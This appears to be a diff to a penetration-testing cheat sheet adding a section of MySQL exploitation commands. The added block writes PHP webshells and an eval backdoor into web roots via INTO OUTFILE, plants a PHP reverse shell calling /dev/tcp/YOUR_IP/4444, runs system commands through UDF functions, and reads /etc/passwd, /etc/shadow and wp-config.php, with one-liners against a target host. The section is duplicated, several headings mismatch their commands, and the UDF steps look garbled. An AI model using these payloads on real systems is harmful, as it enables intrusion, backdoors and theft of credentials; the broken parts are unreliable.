@@ -69,7 +69,117 @@ nmap -p 1433 --script ms-sql-dump-hashes --script-args mssqlusername='sa',mssqlp
 nmap -p 1433 --script ms-sql-config <target> --script-args mssqlusername='sa',mssqlpassword='pass'
 ```
 
-### MSSQL Exploitation Commands
+## MySQL Exploitation Commands
+```bash
+-- Current user & privileges
+SELECT user(), current_user(), @@version;
+SHOW GRANTS FOR CURRENT_USER();
+
+-- All users & hosts
+SELECT user, host, account_locked FROM mysql.user;
+SELECT user,host FROM mysql.user WHERE User NOT LIKE '%mysql.sys';
+
+-- Databases & tables
+SHOW DATABASES;
+USE <dbname>; SHOW TABLES;
+SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();
+
+-- Processes
+SHOW PROCESSLIST;
+SELECT * FROM information_schema.processlist WHERE user != 'system user';
+
+```
+## MySQL Exploitation Commands
+```bash
+-- Current user & privileges
+SELECT user(), current_user(), @@version;
+SHOW GRANTS FOR CURRENT_USER();
+
+-- All users & hosts
+SELECT user, host, account_locked FROM mysql.user;
+SELECT user,host FROM mysql.user WHERE User NOT LIKE '%mysql.sys';
+
+-- Databases & tables
+SHOW DATABASES;
+USE <dbname>; SHOW TABLES;
+SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE();
+
+-- Processes
+SHOW PROCESSLIST;
+SELECT * FROM information_schema.processlist WHERE user != 'system user';
+
+=========== OUTFILE Webshell (Ən sürətli) ===========
+-- Create UDF dir (if writable)
+SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/tmp/test.php';
+SELECT LOAD_FILE('/tmp/test.php');
+
+-- Linux UDF RCE (mysql root)
+-- Önce lib_mysqludf_sys.so yaradın/upload edin
+CREATE FUNCTION sys_exec RETURNS INTEGER SONAME 'lib_mysqludf_sys.so';
+CREATE FUNCTION sys_eval RETURNS STRING  SONAME 'lib_mysqludf_sys.so';
+SELECT sys_exec('whoami');
+SELECT sys_eval('id');
+
+-- Cleanup
+DROP FUNCTION sys_exec; DROP FUNCTION sys_eval;
+
+=========== LOAD_FILE Read (Local files) ===========
+-- PHP webshell (Apache)
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/var/www/html/shell.php';
+
+-- Nginx
+SELECT '<?php system($_GET["c"]); ?>' INTO OUTFILE '/usr/share/nginx/html/shell.php';
+
+-- Reverse shell
+SELECT '<?php exec("/bin/bash -c \"bash -i >& /dev/tcp/YOUR_IP/4444 0>&1\""); ?>' INTO OUTFILE '/var/www/html/rs.php';
+
+-- Multi-shell
+SELECT '<?php @eval($_POST["pass"]); ?>' INTO OUTFILE '/var/www/html/admin.php';
+
+=========== LOAD_FILE Read (Local files) ===========
+-- Config files
+SELECT LOAD_FILE('/etc/passwd');
+SELECT LOAD_FILE('/var/www/html/wp-config.php');
+SELECT LOAD_FILE('/etc/shadow'); -- root lazım
+
+-- Hexdump böyük files
+SELECT HEX(LOAD_FILE('/etc/passwd'));
+
+-- MySQL config
+SELECT LOAD_FILE('/etc/mysql/my.cnf');
+SELECT @@datadir, @@basedir;
+
+=========== MYSQL UDF Assembly (Advanced RCE) ===========
+-- Dir yaz (UDF üçün)
+SELECT 'CREATE TABLE IF NOT EXISTS udf (a int) ENGINE=MyISAM;' INTO OUTFILE '/tmp/udf.sql';
+-- MySQL restart lazım sonra: LOAD DATA INFILE='/tmp/udf.so' INTO TABLE mysql_func ...
+
+-- Windows UDF
+SELECT 0x90 INTO DUMPFILE 'C:\\mysql\\lib\\plugin\\udf.dll';
+
+=========== Privilege Escalation ===========
+-- Superpriv users
+SELECT user,host,super FROM mysql.user WHERE super=1;
+
+-- Impersonation (plugin abuse)
+UPDATE mysql.user SET plugin='unix_socket' WHERE user='root';
+
+-- File priv check
+SHOW GRANTS FOR 'user'@'host';
+SELECT @@secure_file_priv;
+
+=========== MYSQLCLIENT ONE-LINERS ===========
+# Webshell
+mysql -u root -p -h target -e "SELECT '<?php system(\$_GET[\"c\"]); ?>' INTO OUTFILE '/var/www/html/shell.php';"
+
+# UDF dir
+mysql -u root -p -h target -e "SELECT 'CREATE TABLE IF NOT EXISTS udf (a int) ENGINE=MyISAM;' INTO OUTFILE '/tmp/udf.sql';"
+
+# File read
+mysql -u root -p -h target -e "SELECT LOAD_FILE('/etc/passwd');"
+```
+
+## MSSQL Exploitation Commands
 
 ```bash
 -- Service accounts
